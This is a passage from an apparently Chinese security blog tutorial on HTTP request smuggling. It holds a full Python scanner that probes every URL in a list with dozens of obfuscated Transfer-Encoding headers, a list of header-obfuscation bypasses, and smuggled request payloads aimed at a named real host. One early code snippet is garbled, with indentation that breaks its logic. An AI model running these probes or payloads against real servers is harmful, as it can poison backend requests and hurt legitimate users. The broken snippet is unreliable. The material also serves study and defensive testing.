class="line">\r\n</span><br></pre></td></tr></table></figure><p>而由于后端服务器使用CL解析，解析<code>Content-Length: 6</code>便会尝试获取请求报文中的6字节内容，而<code>0\r\n\r\n</code>只有5个字节，后端服务器会等待第6个字节直至超时。</p><p>如果服务端是CL.TE类型，则此检测方法将使X毒化后端服务器的请求，从而可能损害合法用户。但是我们可以通过先执行CL.TE类HRS的检测再执行TE.CL类HRS的检测来避免这个问题。</p><p>代码实现如下，通过判断CL为6超时、CL为5不超时来确定是存在TE.CL型HRS漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_TECL(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">                t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">                        <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                            self.valid = <span class="keyword">True</span></span><br><span class="line">                            self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                            self.headers_payload = [headers]</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="网上参考的脚本"><a href="#网上参考的脚本" class="headerlink" title="网上参考的脚本"></a>网上参考的脚本</h3><p>基于上面的基础，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author: xph</span></span><br><span class="line"><span class="string">CreateTime: 2019-09-18</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">http.client._is_legal_header_name = <span class="keyword">lambda</span> x: <span class="keyword">True</span></span><br><span class="line">http.client._is_illegal_header_value = <span class="keyword">lambda</span> x: <span class="keyword">False</span></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"res.txt"</span>, <span class="string">'a'</span>)</span><br><span class="line">fp.write(<span class="string">"\n"</span> + <span class="string">"-"</span> * <span class="number">50</span> + <span class="string">"\n"</span>)</span><br><span class="line">fp.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTP_REQUEST_SMUGGLER</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.headers_payload = []</span><br><span class="line">        self.valid = <span class="keyword">False</span></span><br><span class="line">        self.type = <span class="string">""</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.Transfer_Encoding1 = [[<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding "</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer_Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">" Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"  chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Content-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\n chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding\n "</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \"chunked\""</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" 'chunked'"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked, cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow, "</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r\nTransfer-encoding: cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunk"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"TrAnSFer-EnCODinG"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"TRANSFER-ENCODING"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\t"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer\r-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"barn\n\nTransfer-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   ]</span><br><span class="line"></span><br><span class="line">        self.Transfer_Encoding = list(self.Transfer_Encoding1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding1:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">" "</span> == x[<span class="number">1</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]:</span><br><span class="line">                    <span class="comment"># print (type(chr(i)))</span></span><br><span class="line">                    c = str(chr(i))</span><br><span class="line">                    self.Transfer_Encoding.append([x[<span class="number">0</span>], c + x[<span class="number">1</span>][<span class="number">1</span>:]])</span><br><span class="line"></span><br><span class="line">        self.payload_headers = []</span><br><span class="line">        self.n1 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding:</span><br><span class="line">            headers = collections.OrderedDict()</span><br><span class="line">            headers[x[<span class="number">0</span>]] = x[<span class="number">1</span>]</span><br><span class="line">            headers[<span class="string">'Cache-Control'</span>] = <span class="string">"no-cache"</span></span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            headers[<span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span></span><br><span class="line">            self.payload_headers.append(headers)</span><br><span class="line">            self.n1 = self.n1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_CLTE</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            <span class="keyword">return</span> resp_time</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            resp_time = <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line">                <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_TECL</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            print(resp, resp_time)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                resp_time = <span class="number">10</span></span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(resp_time)</span></span><br><span class="line">        <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> (t1, t2)</span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_TECL(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">            t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            h = &#123;</span><br><span class="line">                <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"</span>&#125;</span><br><span class="line">            requests.get(self.url, headers=h, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check_CLTE():</span><br><span class="line">                self.check_TECL()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            print(<span class="string">"timeout: "</span> + self.url)</span><br><span class="line">        <span class="keyword">return</span> self.recheck()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"recheck"</span>)</span><br><span class="line">        print(self.valid, self.type)</span><br><span class="line">        <span class="keyword">if</span> self.valid:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="string">"CL-TE"</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_CLTE():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find CL-TE: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"CL-TE\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"CL-TE"</span>, payload]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_TECL():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find TE-CL: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"TE-CL\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"TE-Cl"</span>, payload]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(url)</span>:</span></span><br><span class="line">    a = HTTP_REQUEST_SMUGGLER(url)</span><br><span class="line">    print(a.run())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> threadpool</span><br><span class="line">    iter_list = open(<span class="string">"urls.txt"</span>).read().split(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    pool = threadpool.ThreadPool(<span class="number">30</span>)</span><br><span class="line">    thread_requests = threadpool.makeRequests(func, iter_list)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> thread_requests]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line">func(<span class="string">"https://example.com"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x06-Bypass技巧"><a href="#0x06-Bypass技巧" class="headerlink" title="0x06 Bypass技巧"></a>0x06 Bypass技巧</h2><h3 id="混淆TE头"><a href="#混淆TE头" class="headerlink" title="混淆TE头"></a>混淆TE头</h3><p>前面提到了一些混淆TE头的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>除此之外，更多的一些混淆方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding :chunked</span><br><span class="line">Transfer_Encoding:chunked</span><br><span class="line">Transfer Encoding:chunked</span><br><span class="line"> Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:  chunked</span><br><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:\tchunked</span><br><span class="line">Transfer-Encoding:\u000Bchunked</span><br><span class="line">Content-Encoding: chunked</span><br><span class="line">Transfer-Encoding:\n chunked</span><br><span class="line">Transfer-Encoding\n : chunked</span><br><span class="line">Transfer-Encoding: \&quot;chunked\&quot;</span><br><span class="line">Transfer-Encoding: &apos;chunked&apos;</span><br><span class="line">Transfer-Encoding: \n\u000Bchunked</span><br><span class="line">Transfer-Encoding: \n\tchunked</span><br><span class="line">Transfer-Encoding: chunked, cow</span><br><span class="line">Transfer-Encoding: cow, </span><br><span class="line">Transfer-Encoding: chunked\r\nTransfer-encoding: cow</span><br><span class="line">Transfer-Encoding: chunk</span><br><span class="line">Transfer-Encoding: cHuNkeD</span><br><span class="line">TrAnSFer-EnCODinG: cHuNkeD</span><br><span class="line">Transfer-Encoding: CHUNKED</span><br><span class="line">TRANSFER-ENCODING: CHUNKED</span><br><span class="line">Transfer-Encoding: chunked\r</span><br><span class="line">Transfer-Encoding: chunked\t</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer\r-Encoding: chunked</span><br><span class="line">barn\n\nTransfer-Encoding: chunked</span><br></pre></td></tr></table></figure><h3 id="设置X-Forwarded-Proto以解决无法HTTP发送的问题"><a href="#设置X-Forwarded-Proto以解决无法HTTP发送的问题" class="headerlink" title="设置X-Forwarded-Proto以解决无法HTTP发送的问题"></a>设置X-Forwarded-Proto以解决无法HTTP发送的问题</h3><p>原payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comHTTP/1.1 301 Moved PermanentlyLocation: https://staging-alerts.newrelic.com/</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 404 Not FoundAction Controller: Exception caught</span><br></pre></td></tr></table></figure><h3 id="设置X-nr-external-service授权标头"><a href="#设置X-nr-external-service授权标头" class="headerlink" title="设置X-nr-external-service授权标头"></a>设置X-nr-external-service授权标头</h3><p>原payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 200 OKNot authorized with header:</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: 